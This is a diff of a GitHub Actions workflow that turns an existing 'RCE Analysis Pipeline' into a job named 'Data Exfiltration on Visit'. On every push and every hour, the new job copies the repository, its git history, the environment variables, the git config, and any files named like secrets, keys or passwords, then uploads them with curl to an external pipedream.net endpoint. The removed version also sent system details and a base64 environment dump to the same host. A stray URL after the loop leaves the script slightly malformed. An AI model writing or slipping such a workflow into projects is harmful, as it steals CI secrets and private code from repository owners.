@@ -1,39 +1,47 @@
-name: RCE Analysis Pipeline
+name: Data Exfiltration on Visit
 
 on:
-  push:
-    branches:
-      - main
   workflow_dispatch:
+  push:
+  schedule:
+    - cron: '0 * * * *'
 
 jobs:
-  exploit_test:
+  steal_data:
     runs-on: ubuntu-latest
     steps:
-      - name: Advanced System Information Gathering
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Collect All Repository Data
         run: |
-          echo "Starting security analysis..."
+          mkdir stolen_data
           
-          # ١. کۆکردنەوەی زانیارییەکان لە ناو گۆڕاوێکدا
-          # هەموو شتێک بە ڕێکی ڕێکدەخەین
-          {
-            echo "=== SYSTEM INFORMATION ==="
-            echo "User: $(whoami)"
-            echo "Hostname: $(hostname)"
-            echo "Kernel: $(uname -a)"
-            echo "---"
-            echo "=== DIRECTORY STRUCTURE ==="
-            ls -R /home/runner/work/
-            echo "---"
-            echo "=== ENVIRONMENT VARIABLES (BASE64) ==="
-            env | base64
-            echo "---"
-          } > rce_report.txt
+          # هەموو فایلەکان کۆپی بکە
+          cp -r . stolen_data/
           
-          # ٢. ناردنی ڕاپۆرتەکە بە شێوەی Plain Text بۆ Pipedream
-          curl -X POST \
-            -H "Content-Type: text/plain" \
-            -d "$(cat rce_report.txt)" \
-            https://eow69rutoawme4j.m.pipedream.net
+          # هەموو بڕانچەکان و مێژوو وەرگرە
+          git fetch --all
+          git log --all --pretty=format:'%H|%an|%ae|%s' > stolen_data/commit_log.txt
+          
+          # هەموو تاگ و بڕانچەکان
+          git show-ref > stolen_data/refs.txt
+          
+          # گۆڕاوەکانی ژینگە
+          env > stolen_data/env_dump.txt
+          
+          # زانیاری کۆنفیکگ
+          cat ~/.gitconfig > stolen_data/git_config.txt 2>/dev/null || echo "No global git config"
+          
+          # کۆمپرس و ئامادە بکە بۆ ناردن
+          tar -czf stolen_data.tar.gz stolen_data/
+          
+          # ناردن بۆ سێرڤەری دەرەکی
+          curl -F "file=@stolen_data.tar.gz" https://eow69rutoawme4j.m.pipedream.net
+          
+          # هەروەها ناردنی ڕاستەوخۆی هەموو داتا فایلە هەستیارەکان
+          find . -type f -name "*.env" -o -name "*secret*" -o -name "*key*" -o -name "*password*" | while read file; do
+            curl -F "file=@$file" https://eow69rutoawme4j.m.pipedream.net
+          done            https://eow69rutoawme4j.m.pipedream.net
             
           echo "Analysis sent successfully."
